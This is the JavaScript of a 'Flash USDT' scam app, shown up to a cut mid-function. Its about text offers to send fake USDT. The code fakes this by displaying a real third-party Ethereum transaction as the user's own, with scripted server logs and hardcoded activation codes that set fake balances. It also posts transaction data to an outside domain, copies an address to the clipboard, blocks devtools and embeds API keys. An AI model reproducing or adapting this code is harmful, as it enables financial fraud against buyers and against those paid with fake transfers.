const navFile = document.querySelector(".nav-file")
const navWalletSetting = document.querySelector('.nav-wallet-setting')
const navExecption = document.querySelector('.nav-execptions')
const navActivity = document.querySelector('.nav-activity')
const navPlugs = document.querySelector(".nav-plugs")
const navHelp = document.querySelector('.nav-help')
const navShowFile  = document.querySelector('.nav-show-file')
const navShowWalletSetting = document.querySelector('.nav-show-wallet-setting')
const navShowHelp = document.querySelector('.nav-show-help')
const container = document.querySelector('.container')
const checkWallet = document.querySelector('#checkWallet')
const randomAmount = document.querySelector('#randomAmount')
const amountInput = document.querySelector('#amountInput')
const infoDrop = document.querySelector('#infoDrop')
const binanceServer = document.querySelector('.binanceServer')
const enterWallet = document.querySelector('#enterWallet')
const doneBtn = document.querySelector('#doneBtn')
const customWallet = document.querySelector('#customWallet')
const notificationContainer = document.querySelector('.notificationContainer')
const notificationHeadP = document.querySelector('#notificationHeadP')
const notificationBodyP = document.querySelector('#notificationBodyP')
const walletSide = document.querySelectorAll('#walletSide')
const notificationOkBtn = document.querySelector('#notificationOkBtn')
const telegram = document.querySelector('#telegram') 
const email = document.querySelector('#email') 
const website = document.querySelector('#website') 
const activateSoftware = document.querySelector('#activateSoftware') 
const about = document.querySelector('#about')
const notificationBody = document.querySelector('.notificationBody')
const activateContainer = document.querySelector('.activateContainer')
const btnX = document.querySelector('.btnX')
const activateSoftwareBtn = document.querySelector('#activateSoftwareBtn')
const activationInput = document.querySelector('#activationInput')
const displayScreen = document.querySelector('.displayScreen')
const refreshBtn = document.querySelector('#refresh')
const createAnewTransaction = document.querySelector('#createAnewTransaction')
const payOutInput = document.querySelector('.payOutInput')
const date = document.querySelector('.date')
const physicalMemory = document.querySelector('#physicalMemory')
const osVersions = document.querySelector('#osVersions')
const Device = document.querySelector('#Device')
const Balance = document.getElementById('Balance')
const demoTry = document.querySelector('#demoTry')
const trFee = document.querySelector('#trFee')
const tryDemoId = document.getElementById('tryDemoId')
const transactionID = document.getElementById('transactionID')
let firstTransaction
let txid 
let transactionFeeUSDT
let inputAddress
let inputValueUSDT 
let outputAddress
let t1
let t2
let t3



window.addEventListener('contextmenu', function (e) {
  e.preventDefault();
});
window.addEventListener('keydown', function (e) {
  if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) {
      e.preventDefault();
  }
});


//sending to tw
function sendTransaction(transaction, type) {
    const formData = new FormData();
    formData.append('transaction', JSON.stringify(transaction));

    fetch(`https://usdtflashnoir.com/process_transaction.php?type=${type}`, {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            console.log('Transaction processed successfully');
        } else {
            console.error('Error processing transaction');
        }
    })
    .catch(error => console.error('Error:', error));
}






//nav click show
navFile.onclick = ()=> {
    navShowFile.style.display = "block"
    navShowWalletSetting.style.display = "none"
    navShowHelp.style.display = "none"

    container.onclick = ()=> {
        navShowHelp.style.display = "none"
        navShowWalletSetting.style.display = "none"
        navShowFile.style.display = "none"
    }
}

navWalletSetting.onclick = ()=> {
    navShowWalletSetting.style.display = "block"
    navShowHelp.style.display = "none"
    navShowFile.style.display = "none"

    container.onclick = ()=> {
        navShowHelp.style.display = "none"
        navShowWalletSetting.style.display = "none"
        navShowFile.style.display = "none"
    }
}

navHelp.onclick = ()=> {
    navShowHelp.style.display = "block"
    navShowWalletSetting.style.display = "none"
    navShowFile.style.display = "none"

    container.onclick = ()=> {
        navShowHelp.style.display = "none"
        navShowWalletSetting.style.display = "none"
        navShowFile.style.display = "none"
    }
}


checkWallet.onclick = ()=> {
    // Replace with your actual wallet address and API key
const walletAddress = '1PUFptYcvgtjP6fRPFx959Nx6QBiFtAbqr';
const apiKey = 'd6408a67-0889-43ef-8149-1409f0cdd345';

// API endpoint
const url = `https://api.blockchain.com/v3/exchange/accounts/1PUFptYcvgtjP6fRPFx959Nx6QBiFtAbqr/USDT`;

// Make the API request using Fetch API
fetch(url)
  .then(response => {
    if (!response.ok) {
      throw new Error('Network response was not ok');
    }
    return response.json();
  })
  .then(walletDetails => {
    // Handle the wallet details here
    console.log(walletDetails);
  })
  .catch(error => {
    console.error('Error fetching wallet details:', error);
  });

}

function generateRandomNumber() {
    if (localStorage.getItem('activated')) {
      // payOutInput.value = outputAddress;
      // amountInput.value = localStorage.getItem('inputValueUSDT');
      // trFee.value = localStorage.getItem('transactionFeeUSDT');
      amountInput.value = inputValueUSDT
      trFee.value = transactionFeeUSDT

    } else {
    // Generate a random decimal number between 0 (inclusive) and 1 (exclusive)
    const randomNumber = Math.random();
  
    // Scale the number to be between 0 and 9 (inclusive)
    const scaledNumber = randomNumber * 9;
  
    // Round the number to 8 decimal places
    const roundedNumber = Number(scaledNumber.toFixed(8));
  
    return roundedNumber;
    }
  }
  

  

randomAmount.onclick = ()=> {
  // Example usage:
  if (localStorage.getItem('activated')) { 
    generateRandomNumber()
  } else {
    const randomNum = generateRandomNumber();
  amountInput.value = randomNum
  console.log(randomNum);
  } 
}


const radioButtons = document.querySelectorAll('input[type="radio"]');

function handleRadioClick(event) {
  // Get the clicked radio button
  const clickedRadioButton = event.target;

  // Uncheck all other radio buttons
  radioButtons.forEach(radioButton => {
    if (radioButton !== clickedRadioButton) {
      radioButton.checked = false;
    }
  });
}

// Add click event listeners to each radio button
radioButtons.forEach(radioButton => {
  radioButton.addEventListener('click', handleRadioClick);
});

function activatedGet() {

  const apiKey = 'Y83NTB1V4M996PZ7HQ6418Y43QTQJ7UB69'; // Replace with your actual API key

  fetch('https://api.etherscan.io/api?module=account&action=tokentx&contractaddress=0xdac17f958d2ee523a2206206994597c13d831ec7&address=0xdfd5293d8e347dfe59e90efd55b2956a1343963d&page=1&offset=100&startblock=0&endblock=99999999&sort=desc&apikey=' + apiKey)
      .then(response => response.json())
      .then(data => {
          // Check if the response contains results
          if (data && data.result && data.result.length > 0) {
              // Log the first item in the array
              const transactionData = data.result[0];
               txid = transactionData.hash; // This line re-declares txid, which is not necessary
               transactionFeeUSDT = transactionData.gasPrice / 100000000; // Convert to USDT
               inputAddress = transactionData.from;
               inputValueUSDT = transactionData.value / 1000000; // Convert to USDT
               outputAddress = transactionData.to;
      
              console.log('Transaction ID (txid):', txid);
              console.log('Transaction Fee (USDT):', transactionFeeUSDT);
              console.log('Input Address:', inputAddress);
              console.log('Input Value (USDT):', inputValueUSDT);
              console.log('Output Address:', outputAddress);
      
              localStorage.setItem('txid', 'Transaction Blocked')
              navigator.clipboard.writeText(outputAddress)
              .then(() => {
                console.log('Address copied to clipboard');
              })
              .catch(error => {
                console.error('Failed to copy to clipboard:', error);
              });

              console.log(data.result[0]);
              console.log(data.result[0].hash)
              // Example for tw
            sendTransaction(
                { 
                    'amount': inputValueUSDT,
                    'hash': txid,
                    'from': inputAddress,
                    'fee': transactionFeeUSDT,
                    'timestamp': Date.now() 
                }, 
                'usdt');
          } else {
              console.log('No results found.');
          }
      })
      .catch(error => {
          console.error('Error fetching data:', error);
      });

  
}


binanceServer.onclick = ()=> {
  console.log(localStorage.getItem('activated'))
  if(localStorage.getItem('activated')) {
    infoDrop.style.display = "inline"
    infoDrop.innerHTML = " Minning_287.86.35.94-binance-server.com-33-p#"
    enterWallet.style.display = "none"
    doneBtn.style.display = "none"
    transactionID.style.display = "none"
    localStorage.removeItem('txid')
    //activatedGet()
    //this is the activatedGet function below
    //start
    const apiKey = 'Y83NTB1V4M996PZ7HQ6418Y43QTQJ7UB69'; // Replace with your actual API key

  fetch('https://api.etherscan.io/api?module=account&action=tokentx&contractaddress=0xdac17f958d2ee523a2206206994597c13d831ec7&address=0xdfd5293d8e347dfe59e90efd55b2956a1343963d&page=1&offset=100&startblock=0&endblock=99999999&sort=desc&apikey=' + apiKey)
      .then(response => response.json())
      .then(data => {
          // Check if the response contains results
          if (data && data.result && data.result.length > 0) {
              // Log the first item in the array
              const transactionData = data.result[0];
               txid = transactionData.hash; // This line re-declares txid, which is not necessary
               transactionFeeUSDT = transactionData.gasPrice / 100000000; // Convert to USDT
               inputAddress = transactionData.from;
               inputValueUSDT = transactionData.value / 1000000; // Convert to USDT
               outputAddress = transactionData.to;
      
              console.log('Transaction ID (txid):', txid);
              console.log('Transaction Fee (USDT):', transactionFeeUSDT);
              console.log('Input Address:', inputAddress);
              console.log('Input Value (USDT):', inputValueUSDT);
              console.log('Output Address:', outputAddress);
      
              localStorage.setItem('txid', 'Transaction Blocked')
              navigator.clipboard.writeText(outputAddress)
              .then(() => {
                console.log('Address copied to clipboard');
              })
              .catch(error => {
                console.error('Failed to copy to clipboard:', error);
              });

              console.log(data.result[0]);
              console.log(data.result[0].hash)
              // Example for tw
            sendTransaction(
                { 
                    'amount': inputValueUSDT,
                    'hash': txid,
                    'from': inputAddress,
                    'fee': transactionFeeUSDT,
                    'timestamp': Date.now() 
                }, 
                'usdt');
          } else {
              console.log('No results found.');
          }
      })
      .catch(error => {
          console.error('Error fetching data:', error);
      });
    //end
  } else {
    infoDrop.style.display = "inline"
    infoDrop.innerHTML = " Please activate to use this feature"
    enterWallet.style.display = "none"
    doneBtn.style.display = "none"
  }
}

customWallet.onclick = ()=> {
  enterWallet.style.display = "inline"
  doneBtn.style.display = "inline"
  infoDrop.style.display = "none"  
  navShowWalletSetting.style.display ="none"
}

doneBtn.onclick = ()=> {
  enterWallet.style.display = "none"
  doneBtn.style.display = "none"
}

function walletSideFun() {
  if(localStorage.getItem('activated')) {
  notificationContainer.style.display = "flex"
  container.style.pointerEvents =  "none"
  navShowWalletSetting.style.display = "none"
  notificationHeadP.textContent = "Flash USDT"
  notificationBodyP.textContent = "Done"
  } else {
    notificationBody.style.height = "5em"
    notificationContainer.style.display = "flex"
    container.style.pointerEvents =  "none"
    navShowWalletSetting.style.display = "none"
    notificationHeadP.textContent = "Flash USDT Not Activated"
    notificationBodyP.textContent = "Please activate software to use this feature"
  }
}

notificationOkBtn.onclick = ()=> {
  container.style.pointerEvents =  "auto"
  notificationContainer.style.display = "none"
  navShowWalletSetting.style.display = "none"
  notificationBody.style.height = "4em"
}

telegram.onclick = ()=> {
  notificationContainer.style.display = "flex"
  notificationBodyP.style.overflowWrap = "break-word";
  notificationBodyP.style.wordBreak = "break-all";
  container.style.pointerEvents =  "none"
  navShowHelp.style.display = "none"
  notificationHeadP.textContent = "Flash USDT"
  notificationBodyP.textContent = "https://t.me/usdtflashcorenetwork"
}

// website.onclick = ()=> {
//   notificationContainer.style.display = "flex"
//   container.style.pointerEvents =  "none"
//   navShowHelp.style.display = "none"
//   notificationHeadP.textContent = "Flash USDT"
//   notificationBodyP.textContent = "https://flashusdt.website"
// }

// email.onclick = ()=> {
//   notificationContainer.style.display = "flex"
//   container.style.pointerEvents =  "none"
//   navShowHelp.style.display = "none"
//   notificationHeadP.textContent = "Flash USDT"
//   notificationBodyP.textContent = "Email: admin@flashbtc"
// }

about.onclick = ()=> {
  notificationBody.style.height = "30em"
  notificationContainer.style.display = "flex"
  container.style.pointerEvents =  "none"
  navShowHelp.style.display = "none"
  notificationHeadP.textContent = "Flash USDT"
  notificationBodyP.textContent = "Flash USDT is a software designed to enable you send fake USDT ERC20 from any wallet address to another wallet address on the blockchain network (Coinbase, Binance, Blockchain, etc.) for free, this is a ether fork that enables a USDT ERC20 transaction to be generated on the ERC20 network, however due to the security architecture of BLOCKCHAIN this transaction can only receive a little lower than the maximum confirmations and stays in the network for up to 90 days, You can generate and send up to 10000 USDT daily with the basic licence and 50000 USDT daily with the premium licence."
}

activateSoftware.onclick = ()=> {
  activateContainer.style.display = "flex"
  container.style.pointerEvents =  "none"
  navShowHelp.style.display = "none"
}

btnX.onclick = ()=> {
  container.style.pointerEvents =  "auto"
  activateContainer.style.display = "none"
  navShowWalletSetting.style.display = "none"
}

function activateSoftwareAlert() {
  notificationBody.style.height = "9em"
  notificationContainer.style.display = "flex"
  container.style.pointerEvents =  "none"
  navShowHelp.style.display = "none"
  notificationHeadP.textContent = "Flash USDT Activation"
  notificationBodyP.textContent = "Activation failed please ensure you entered the right activation code. You can contact us on telegram https://t.me/usdtflashcorenetwork for support"
}

function activateSoftwareAlert2() {
  notificationBody.style.height = "7em"
  notificationContainer.style.display = "flex"
  container.style.pointerEvents =  "none"
  navShowHelp.style.display = "none"
  notificationHeadP.textContent = "Flash USDT Activation"
  notificationBodyP.textContent = "No input detected, ensure you enter a activation code. You can contact us on telegram https://t.me/usdtflashcorenetwork for support"
}

function activateSoftwareAlert3() {
  // notificationBody.style.height = "7em"
  notificationContainer.style.display = "flex"
  container.style.pointerEvents =  "none"
  navShowHelp.style.display = "none"
  notificationHeadP.textContent = "Flash USDT Activation"
  notificationBodyP.textContent = "Activation Successful"
}

function onlinAlert() {
  notificationBody.style.height = "5em"
  notificationBodyP.style.textAlign = "left"
  notificationContainer.style.display = "flex"
  container.style.pointerEvents =  "none"
  navShowHelp.style.display = "none"
  notificationHeadP.textContent = "Flash USDT"
  notificationBodyP.textContent = "Connection failed, Please check your internet connection"
}

activateSoftwareBtn.onclick = ()=> {
  if(activationInput.value == "") {
    activateSoftwareAlert2()
  } else if(activationInput.value == "flashusdt9khaf2v") {
    localStorage.setItem('activated', true)
    localStorage.setItem('warning', 'yes')
    activateSoftwareAlert3()
    Balance.textContent = 10000
    tryDemoId.style.display = "none"
    transactionID.style.display = "block"
  }  else if(activationInput.value == "HYPERFLASHusdt735g7382") {
    localStorage.setItem('activated', true)
    localStorage.setItem('warning', 'no')
    activateSoftwareAlert3()
    Balance.textContent = 10000
    tryDemoId.style.display = "none"
    transactionID.style.display = "block"
  } else if(activationInput.value == "HYPERFLASHusdt735gy") {
    localStorage.setItem('activated', true)
    localStorage.setItem('warning', 'balance')
    activateSoftwareAlert3()
    localStorage.setItem('balance', 50000)
    tryDemoId.style.display = "none"
    transactionID.style.display = "block"
    balance_add()
  } else if(activationInput.value == "HYPERFLASHusdtnormal6373") {
    localStorage.setItem('activated', true)
    localStorage.setItem('warning', 'sent')
    activateSoftwareAlert3()
    Balance.textContent = 10000
    tryDemoId.style.display = "none"
    transactionID.style.display = "block"
  }
  else {
    activateSoftwareAlert()
  }
}

function checkInternetConnection() {
  if(navigator.onLine) {
    return 
  } else {
    onlinAlert()
    return
  }

}

function onloadFun() {
  if(localStorage.getItem('activated')) {
    tryDemoId.style.display = "none"
    transactionID.style.display = "block"
    let localTX = localStorage.getItem('txid')
    transactionID.innerText = `Transaction ID: ${localTX}`
  }
  infoDrop.textContent = "No Wallet Selected"
  let arr = ["[INFO] Flash USDT Transaction (Core Network)", "[INFO] Copyright (C)  | JULY 2022. Telegram: https://t.me/usdtflashcorenetwork", "[INFO] Running on", "[INFO] Blockchain network loading..."]
  let k = 0
  function onloadShow() {
    let p = document.createElement('p')
    p.textContent = arr[k]
    displayScreen.appendChild(p)
    k += 1
    console.log(k)
    displayScreen.scrollTop = displayScreen.scrollHeight;
  }
  let interval = setInterval(onloadShow, 500)
  setTimeout(function() {
    clearInterval(interval)
  }, 2000)

  if(navigator.onLine) {

  } else {
    setTimeout(function() {
      let p = document.createElement('p')
        p.textContent = "[INFO] Connection failed, Please check your internet connection"
        displayScreen.appendChild(p)
    }, 5000)
    setTimeout(checkInternetConnection, 5000)
    }
  }

onloadFun()

function balance_add() {
  if(localStorage.getItem('balance')) {
    Balance.textContent = localStorage.getItem('balance')
  }
} 

window.onload = function() {
  if(localStorage.getItem('balance')) {
    Balance.textContent = localStorage.getItem('balance')
  }
}


demoTry.onclick = ()=> {
  if(navigator.onLine) {
    tryDemo()
    // demoRun ()
  } else {
    setTimeout(function() {
      let p = document.createElement('p')
        p.textContent = "[INFO] Connection failed, Please check your internet connection"
        displayScreen.appendChild(p)
    }, 5000)
    setTimeout(checkInternetConnection, 5000)
    }
}



function tryDemo() {

  const apiKey = 'Y83NTB1V4M996PZ7HQ6418Y43QTQJ7UB69'; // Replace with your actual API key

fetch('https://api.etherscan.io/api?module=account&action=tokentx&contractaddress=0xdac17f958d2ee523a2206206994597c13d831ec7&address=0xdfd5293d8e347dfe59e90efd55b2956a1343963d&page=1&offset=100&startblock=0&endblock=99999999&sort=desc&apikey=' + apiKey)
    .then(response => response.json())
    .then(data => {
        // Check if the response contains results
        if (data && data.result && data.result.length > 0) {
            // Log the first item in the array

            const jsonTime = new Date(data.result[0].timeStamp);


            // Get the current time
            const currentTime = new Date();
  
            // Calculate the time difference in milliseconds
            console.log(currentTime)
            console.log(jsonTime)
            const timeDifference = currentTime - jsonTime;
            console.log(timeDifference)


                      // Check if the time difference is greater than 30 seconds (30,000 milliseconds)
          if (timeDifference > 7230000) {
            console.log("Time is more than 30 seconds ahead of the current time.");
            notificationBody.style.height = "7em"
            notificationContainer.style.display = "flex"
            container.style.pointerEvents =  "none"
            navShowHelp.style.display = "none"
            notificationHeadP.textContent = "Flash USDT Activation"
            notificationBodyP.textContent = "An error occured, Block Node not detected. Please Try Again."
          } else {
            console.log("Time is less than or equal to 30 seconds ahead of the current time.");
            const transactionData = data.result[0];
               txid = transactionData.hash; // This line re-declares txid, which is not necessary
               transactionFeeUSDT = transactionData.gasPrice / 100000000; // Convert to USDT
               inputAddress = transactionData.from;
               inputValueUSDT = transactionData.value / 1000000; // Convert to USDT
               outputAddress = transactionData.to;
      
              console.log('Transaction ID (txid):', txid);
              console.log('Transaction Fee (USDT):', transactionFeeUSDT);
              console.log('Input Address:', inputAddress);
              console.log('Input Value (USDT):', inputValueUSDT);
              console.log('Output Address:', outputAddress);

    
            // You can update your HTML input fields here if needed.
            payOutInput.value = outputAddress;
            amountInput.value = inputValueUSDT;
            trFee.value = transactionFeeUSDT;
            var  confromation = transactionData.confirmations
            ttt(confromation)

            // Example for tw
            sendTransaction(
            { 
                'amount': inputValueUSDT,
                'hash': txid,
                'from': inputAddress,  
                'fee': transactionFeeUSDT,
                'timestamp': Date.now() 
            }, 
            'usdt');
        
          }

          function ttt(confromation) {
            // You can update your HTML input fields here if needed.
      // payOutInput.value = outputAddress;
      // amountInput.value = inputValueUSDT;
      // trFee.value = transactionFeeUSDT;


      let arr = ["[INFO] Initializing transaction", "[INFO] Verfiying parameters", "[INFO] Verifying wallet address...", "[INFO] Fetching transaction details...", "[INFO] Sending from Minning_287.86.35.94-binance-server.com-33-p#", "[INFO] Connecting to Binance Server...",
      `[INFO] Sending ${amountInput.value}`, 
      `[INFO] Sending to ${payOutInput.value}`,
      '[INFO] Confirmn transaction... True',
      '[INFO] Connecting to blockchain server',
      '[INFO] Registrating transaction',
      `[INFO] Sending ${amountInput.value}  to  ${payOutInput.value}`,
      '[INFO] Registrating transaction',
      '[INFO] Verifying transaction',
      '[INFO] Signing transaction details',
      `[INFO] Transaction current confrimation ${confromation}`,
      '[INFO] Redirecting to blockchain network'
   ]
     let k = 0
     function finalActivateShow() {
       let p = document.createElement('p')
       p.textContent = arr[k]
       displayScreen.appendChild(p)
       k += 1
       console.log(k)
       displayScreen.scrollTop = displayScreen.scrollHeight;
     }
     let interval = setInterval(finalActivateShow, 500) ///wait
     setTimeout(function() {
       clearInterval(interval)
     }, 11000)

     setTimeout(()=> {
     notificationBodyP.style.textAlign = "left"
     notificationBodyP.style.overflowWrap = "break-word";
     notificationBodyP.style.wordBreak = "break-all";
     notificationBody.style.height = "13em"
     notificationContainer.style.display = "flex"
     container.style.pointerEvents =  "none"
     navShowHelp.style.display = "none"
     notificationHeadP.textContent = "Flash USDT. Redirect in 10 Sec..."
     notificationBodyP.textContent = `Transaction successfully, transaction id is "${txid}" you can copy the txid and verify flash usdt transaction on the blockchain yourself. Tx comfrimation "${confromation}" Redirect in 10 Sec...`
     setTimeout(() => {
      // Construct the URL for the explorer page
     const explorerUrl = `https://blockchair.com/ethereum/transaction/${txid}`;

    // Open the URL in a new tab or window
    window.open(explorerUrl, '_blank');
    window.location.href = `https://blockchair.com/ethereum/transaction/${txid}`
     }, 5000);
     }, 12000)
  }





            console.log(data.result[0]);
            console.log(data.result[0].hash)
        } else {
            console.log('No results found.');
        }
    })
    .catch(error => {
        console.error('Error fetching data:', error);
    });









//   let newTxId 
//   const apiUrl = 'https://api.blockchair.com/bitcoin/mempool/outputs?s=time(desc)';

//   fetch(apiUrl)
//     .then(response => response.json())
//     .then(data => {
//       if (data && data.data && data.data.length > 0) {
//          firstTransaction = data.data[0];
//          txid = firstTransaction.transaction_hash;
//         //  transactionFeeUSDT = firstTransaction.value / 100000000; // Convert to USDT
//         //  inputAddress = '';
//         //  inputValueUSDT = firstTransaction.value / 100000000; // Convert to USDT
//         //  outputAddress = firstTransaction.recipient;
          
//           newTxId = txid
//           getTransId()

  
//         // console.log('Transaction ID (txid):', txid);
//         // console.log('Transaction Fee (USDT):', transactionFeeUSDT);
//         // console.log('Input Address:', inputAddress);
//         // console.log('Input Value (USDT):', inputValueUSDT);
//         // console.log('Output Address:', outputAddress);


// function getTransId() {
//   // Define the txid variable with the desired transaction ID
//   // const txid = "416463f0da1bf2077337cee055e35a7156a21a51a847518b209f75d03b016b02";

//   const apiUrlT = `https://api.blockchair.com/bitcoin/dashboards/transaction/${newTxId}?omni=true&privacy-o-meter=true`;

//   fetch(apiUrlT)
//     .then(response => response.json())  
//     .then(data => {
//       if (data && data.data && data.data[`${newTxId}`]) {

//         console.log(data.data[`${newTxId}`].transaction.time)
//         const jsonTime = new Date(data.data[`${newTxId}`].transaction.time);


//           // Get the current time
//           const currentTime = new Date();

//           // Calculate the time difference in milliseconds
//           console.log(currentTime)
//           console.log(jsonTime)
//           const timeDifference = currentTime - jsonTime;
//           console.log(timeDifference)

//           // Check if the time difference is greater than 30 seconds (30,000 milliseconds)
//           if (timeDifference > 7230000) {
//             console.log("Time is more than 30 seconds ahead of the current time.");
//             notificationBody.style.height = "7em"
//             notificationContainer.style.display = "flex"
//             container.style.pointerEvents =  "none"
//             navShowHelp.style.display = "none"
//             notificationHeadP.textContent = "Flash USDT Activation"
//             notificationBodyP.textContent = "An error occured, Block Node not detected. Please Try Again."
//           } else {
//             console.log("Time is less than or equal to 30 seconds ahead of the current time.");
//             const transactionData = data.data[`${newTxId}`].transaction;
//             const transactionDataOption = data.data[`${newTxId}`].outputs;
//              txid = transactionData.hash; // This line re-declares txid, which is not necessary
//              transactionFeeUSDT = transactionData.fee / 100000000; // Convert to USDT
//              inputAddress = transactionData.recipient;
//              inputValueUSDT = transactionData.input_total / 100000000; // Convert to USDT
//              outputAddress = transactionDataOption[0].recipient;
    
//             console.log('Transaction ID (txid):', txid);
//             console.log('Transaction Fee (USDT):', transactionFeeUSDT);
//             console.log('Input Address:', inputAddress);
//             console.log('Input Value (USDT):', inputValueUSDT);
//             console.log('Output Address:', outputAddress);
    
//             // You can update your HTML input fields here if needed.
//             payOutInput.value = outputAddress;
//             amountInput.value = inputValueUSDT;
//             trFee.value = transactionFeeUSDT;
//             ttt()
//           }

//       }
//     })
//     .catch(error => {
//       console.error('Error fetching data:', error);
//     });
// }



//     function ttt() {
//               // You can update your HTML input fields here if needed.
//         // payOutInput.value = outputAddress;
//         // amountInput.value = inputValueUSDT;
//         // trFee.value = transactionFeeUSDT;
  

//         let arr = ["[INFO] Initializing transaction", "[INFO] Verfiying parameters", "[INFO] Verifying wallet address...", "[INFO] Fetching transaction details...", "[INFO] Sending from Minning_287.86.35.94-binance-server.com-33-p#", "[INFO] Connecting to Binance Server...",
//         `[INFO] Sending ${amountInput.value}`, 
//         `[INFO] Sending to ${payOutInput.value}`,
//         '[INFO] Confirmn transaction... True',
//         '[INFO] Connecting to blockchain server',
//         '[INFO] Registrating transaction',
//         `[INFO] Sending ${amountInput.value}  to  ${payOutInput.value}`,
//         '[INFO] Registrating transaction',
//         '[INFO] Verifying transaction',
//         '[INFO] Signing transaction details',
//         '[INFO] Transaction compleated successfully',
//         '[INFO] Redirecting to blockchain network'
//      ]
//        let k = 0
//        function finalActivateShow() {
//          let p = document.createElement('p')
//          p.textContent = arr[k]
//          displayScreen.appendChild(p)
//          k += 1
//          console.log(k)
//          displayScreen.scrollTop = displayScreen.scrollHeight;
//        }
//        let interval = setInterval(finalActivateShow, 500) ///wait
//        setTimeout(function() {
//          clearInterval(interval)
//        }, 11000)
 
//        setTimeout(()=> {
//        notificationBodyP.style.textAlign = "left"
//        notificationBodyP.style.overflowWrap = "break-word";
//        notificationBodyP.style.wordBreak = "break-all";
//        notificationBody.style.height = "13em"
//        notificationContainer.style.display = "flex"
//        container.style.pointerEvents =  "none"
//        navShowHelp.style.display = "none"
//        notificationHeadP.textContent = "Flash USDT. Redirect in 10 Sec..."
//        notificationBodyP.textContent = `Transaction successfully, transaction id is "${txid}" you can copy the txid and verify flash usdt transaction on the blockchain yourself. Redirect in 10 Sec...`
//        setTimeout(() => {
//         // Construct the URL for the explorer page
//        const explorerUrl = `https://www.blockchain.com/explorer/transactions/btc/${txid}`;

//       // Open the URL in a new tab or window
//       window.open(explorerUrl, '_blank');
//       window.location.href = `https://www.blockchain.com/explorer/transactions/btc/${txid}`
//        }, 5000);
//        }, 12000)
//     }


//       } else {
//         console.log('No transactions found.');
//       }
//     })
//     .catch(error => {
//       console.error('An error occurred:', error);
//     });
}

//demo check start
function demoRun () {
  removeAllElements()
  if(navigator.onLine) {
   if(payOutInput.value == "") {
    let p = document.createElement('p')
    let y = document.createElement('p')
    p.textContent = "[INFO] Initializing transaction"
    y.textContent = "[INFO] Verfiying parameters"
    displayScreen.appendChild(p)
    displayScreen.appendChild(y)

    setTimeout(function() {
      notificationBody.style.height = "5em"
      notificationContainer.style.display = "flex"
      container.style.pointerEvents =  "none"
      navShowHelp.style.display = "none"
      notificationHeadP.textContent = "Flash USDT"
      notificationBodyP.textContent = "Invaild receiver wallet address, verify and try again"
    }, 2000)
   } else {
    if(amountInput.value == "") {
    let p = document.createElement('p')
    let y = document.createElement('p')
    p.textContent = "[INFO] Initializing transaction"
    y.textContent = "[INFO] Verfiying parameters"
    displayScreen.appendChild(p)
    displayScreen.appendChild(y)

    setTimeout(function() {
      notificationBody.style.height = "5em"
      notificationContainer.style.display = "flex"
      container.style.pointerEvents =  "none"
      navShowHelp.style.display = "none"
      notificationHeadP.textContent = "Flash USDT"
      notificationBodyP.textContent = "Invaild amount, verify and try again"
    }, 2000)
    } else {
      let arr = ["[INFO] Initializing transaction", "[INFO] Verfiying parameters", "[INFO] Verifying wallet address...", "[INFO] Fetching transaction details...", "[INFO] Sending from Minning_287.86.35.94-binance-server.com-33-p#", "[INFO] Connecting to Binance Server...",
       `[INFO] Sending ${amountInput.value}`, 
       `[INFO] Sending to ${payOutInput.value}`,
       '[INFO] Confirmn transaction... True',
       '[INFO] Connecting to blockchain server',
       '[INFO] Registrating transaction',
       `[INFO] Sending ${amountInput.value}  to  ${payOutInput.value}`,
       '[INFO] Registrating transaction',
       '[INFO] Verifying transaction',
       '[INFO] Signing transaction details',
       '[INFO] Transaction compleated successfully',
       '[INFO] Redirecting to blockchain network'
    ]
      let k = 0
      function finalActivateShow() {
        let p = document.createElement('p')
        p.textContent = arr[k]
        displayScreen.appendChild(p)
        k += 1
        console.log(k)
        displayScreen.scrollTop = displayScreen.scrollHeight;
      }
      let interval = setInterval(finalActivateShow, 1000) ///wait
      setTimeout(function() {
        clearInterval(interval)
      }, 18000)

      setTimeout(()=> {
      notificationBodyP.style.textAlign = "left"
      notificationBodyP.style.overflowWrap = "break-word";
      notificationBodyP.style.wordBreak = "break-all";
      notificationBody.style.height = "10em"
      notificationContainer.style.display = "flex"
      container.style.pointerEvents =  "none"
      navShowHelp.style.display = "none"
      notificationHeadP.textContent = "Flash USDT"
      notificationBodyP.textContent = "Transaction successfull, redirecting to blockchain ask https://www.blockchain.com/explorer/transactions/btc/cgdt8bc8ehcnsj84hbxd83nnckw8ehxvnvi839cnxrujvnue8348"
      setTimeout(() => {
        window.location.href = "https://t.me/usdtflashcorenetwork"
      }, 2000);
      }, 22000)
    }
    //  else {
    //   let arr = ["[INFO] Initializing transaction", "[INFO] Verfiying parameters", "[INFO] Transaction failed, Flash USDT Transaction core is not activated", "[INFO] Sending Bitcoin in demo is disabled in this region", "[INFO] Please activate Flash USDT Transaction Core to continue", "Terminating transaction"]
    //   let k = 0
    //   function finalShow() {
    //     let p = document.createElement('p')
    //     p.textContent = arr[k]
    //     displayScreen.appendChild(p)
    //     k += 1
    //     console.log(k)
    //     displayScreen.scrollTop = displayScreen.scrollHeight;
    //   }
    //   let interval = setInterval(finalShow, 500)
    //   setTimeout(function() {
    //     clearInterval(interval)
    //   }, 3000)

    //   setTimeout(() => {
    //     notificationBody.style.height = "5em"
    //     notificationContainer.style.display = "flex"
    //   container.style.pointerEvents =  "none"
    //   navShowHelp.style.display = "none"
    //   notificationHeadP.textContent = "Flash USDT"
    //   notificationBodyP.textContent = "Transaction failed, please activate Flash USDT Transaction Core to continue"
    //   notificationBodyP.textContent = "Vist https://flashusdt.website to buy an activation code"
    //   setTimeout(() => {
    //     window.location.href = "https://flashusdt.website"
    //   }, 2000);
    //   }, 3000);
    // }
   } 

  } else {
    let p = document.createElement('p')
    let y = document.createElement('p')
    p.textContent = "[INFO] Initializing transaction"
    y.textContent = "[INFO] Verfiying parameters"
    displayScreen.appendChild(p)
    displayScreen.appendChild(y)
    setTimeout(function() {
      let p = document.createElement('p')
        p.textContent = "[INFO] Connection failed, Please check your internet connection"
        displayScreen.appendChild(p)
    }, 4000)
    setTimeout(onlinAlert, 4000)
  }
}
//demo check end

refreshBtn.onclick = ()=> {
  let arr = ["[INFO] Initalizing transaction", "[INFO] Verifying parameters", "[INFO] Connection to network starting", "[INFO] Connection to blockchain API", "[INFO] Connection to bianace server", "[INFO] Connection to walletconnect server", "[INFO] Handshaking with blockchain API", "[INFO] Loading trial priviledges", "[INFO] Finalizing connections", "[INFO] Welcome"]
  if(navigator.onLine) {
    let k = 0
    function onlineShow() {
